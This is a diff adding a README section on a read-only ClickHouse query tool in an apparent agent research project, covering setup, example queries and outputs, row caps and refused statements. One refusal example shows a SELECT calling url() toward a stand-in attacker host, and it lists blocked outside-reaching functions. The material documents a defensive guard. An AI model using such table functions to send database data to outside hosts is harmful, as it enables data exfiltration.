@@ -141,6 +141,161 @@ Every tool returns the same shape:
 separates a research tool from a raw API wrapper: the agent is told what to
 investigate next instead of having to work it out.
 
+
+### Querying ClickHouse
+
+Configure a service, then ask questions of it. Every example below is real
+output from `clickhouse_query`, not an illustration.
+
+```bash
+export CLICKHOUSE_DEV_URL=https://abc123.eu-west-1.aws.clickhouse.cloud:8443
+export CLICKHOUSE_DEV_USER=default
+export CLICKHOUSE_DEV_PASSWORD=...
+export CLICKHOUSE_DEV_DATABASE=telemetry     # optional default database
+```
+
+HTTPS is required, because ClickHouse Cloud is HTTPS and a typo that sent the
+password in clear text should fail loudly. `http://localhost` and
+`http://127.0.0.1` are the exception, so a local server or the test fixture
+works without TLS.
+
+Add `CLICKHOUSE_PROD_*` for production. Queries run against **dev** unless you
+pass `env: "prod"`, so reaching production is always a deliberate act.
+
+#### Aggregating
+
+The tool is at its best when ClickHouse does the work and returns a few rows.
+
+```json
+{ "statement": "SELECT domain, count() AS queries, countIf(rcode != 0) AS failures FROM dns_queries WHERE ts > now() - INTERVAL 7 DAY GROUP BY domain ORDER BY queries DESC" }
+```
+
+```json
+{
+  "status": "hasResults",
+  "data": {
+    "env": "dev",
+    "columns": [
+      { "name": "domain",   "type": "String" },
+      { "name": "queries",  "type": "UInt64" },
+      { "name": "failures", "type": "UInt64" }
+    ],
+    "rows": [
+      ["example.com",   "56", "8"],
+      ["test.internal", "56", "8"],
+      ["cdn.acme.io",   "56", "8"]
+    ],
+    "rowCount": 3,
+    "truncated": false
+  },
+  "hints": [
+    "Aggregate in ClickHouse rather than post-processing rows — it is far faster and returns fewer tokens.",
+    "This is the dev service. Pass env=prod explicitly if production data is what you need."
+  ],
+  "metadata": { "resultCount": 3, "hasMore": false, "estimatedTokens": 66, "redactionCount": 0 }
+}
+```
+
+`columns` carries ClickHouse's own types, so `UInt64` and `DateTime` survive
+rather than being flattened into strings.
+
+#### Finding your way around
+
+```json
+{ "statement": "SHOW TABLES" }
+{ "statement": "SELECT name, type FROM system.columns WHERE table = 'dns_queries'" }
+{ "statement": "DESCRIBE TABLE dns_queries" }
+```
+
+`system.*` tables are queryable. A forbidden verb appearing inside a qualified
+name — `system.query_log`, `catalog.merge_history` — is an identifier, not a
+verb, and is accepted.
+
+#### Row caps
+
+`maxRows` caps the result, and the response says when it bit. The cap is applied
+by Huginn while decoding, because ClickHouse's own `max_result_rows` does not
+bite at small values.
+
+```json
+{ "statement": "SELECT ts, domain FROM dns_queries ORDER BY ts DESC", "maxRows": 2 }
+```
+
+```json
+{
+  "data": {
+    "columns": [{ "name": "ts", "type": "DateTime" }, { "name": "domain", "type": "String" }],
+    "rows": [["2026-09-24 16:38:19", "example.com"], ["2026-09-24 15:38:19", "test.internal"]],
+    "rowCount": 2,
+    "truncated": true
+  },
+  "hints": ["The row cap was reached: aggregate in SQL, or page with LIMIT n OFFSET m."],
+  "metadata": { "resultCount": 2, "hasMore": true, "estimatedTokens": 56 }
+}
+```
+
+#### What gets refused, and why
+
+**A mutating statement**, refused before it is sent:
+
+```json
+{ "statement": "ALTER TABLE dns_queries DELETE WHERE rcode = 3" }
+```
+```json
+{ "code": "FORBIDDEN_SQL", "retryable": false,
+  "message": "statement begins with \"ALTER\", which is not a read operation",
+  "hint": "Only read queries are permitted. Rewrite this as a SELECT, SHOW, DESCRIBE, EXPLAIN or EXISTS.",
+  "details": { "leadingKeyword": "ALTER" } }
+```
+
+**A table function that reaches outside the database.** This is an ordinary
+`SELECT` that passes every verb check, and a ClickHouse running with
+`readonly=2` executes it — so the refusal comes from Huginn, before the request
+is sent:
+
+```json
+{ "statement": "SELECT * FROM url('http://attacker.example/?d=1','CSV','a String')" }
+```
+```json
+{ "code": "FORBIDDEN_SQL", "retryable": false,
+  "message": "statement calls url(), which is not permitted",
+  "hint": "The function url() can reach outside the database, so it is refused even inside a SELECT. Query a table instead.",
+  "details": { "forbiddenFunction": "url" },
+  "docs": "https://github.com/gstern-CTO/huginn/blob/main/docs/errors/read-only-sql.md" }
+```
+
+`url` `file` `s3` `remote` `mysql` `postgresql` `executable` and the rest are
+refused wherever they appear. A *column* named `url` is fine — literals and
+identifiers are distinguished before the scan.
+
+**An unconfigured environment** names exactly what to set:
+
+```json
+{ "code": "NOT_CONFIGURED",
+  "message": "the ClickHouse \"prod\" environment is not configured",
+  "hint": "Set CLICKHOUSE_PROD_URL, CLICKHOUSE_PROD_USER and CLICKHOUSE_PROD_PASSWORD, then restart the server." }
+```
+
+**A query ClickHouse itself rejects** keeps the engine's own message, which is
+more useful than the status code:
+
+```json
+{ "code": "UPSTREAM_ERROR",
+  "message": "ClickHouse returned HTTP 404: Code: 47. DB::Exception: Unknown expression identifier `nope` …",
+  "hint": "ClickHouse rejected the query. Check the table name with SHOW TABLES and the columns with DESCRIBE." }
+```
+
+#### Trying it locally
+
+```bash
+docker compose --profile fixtures up -d clickhouse
+export CLICKHOUSE_DEV_URL=http://localhost:18123
+export CLICKHOUSE_DEV_USER=analyst
+export CLICKHOUSE_DEV_PASSWORD=fixture-only
+go test -tags=integration -run TestIntegrationClickHouse -v ./internal/tools/
+docker compose --profile fixtures down
+```
+
 ---
 
 ## Configuration
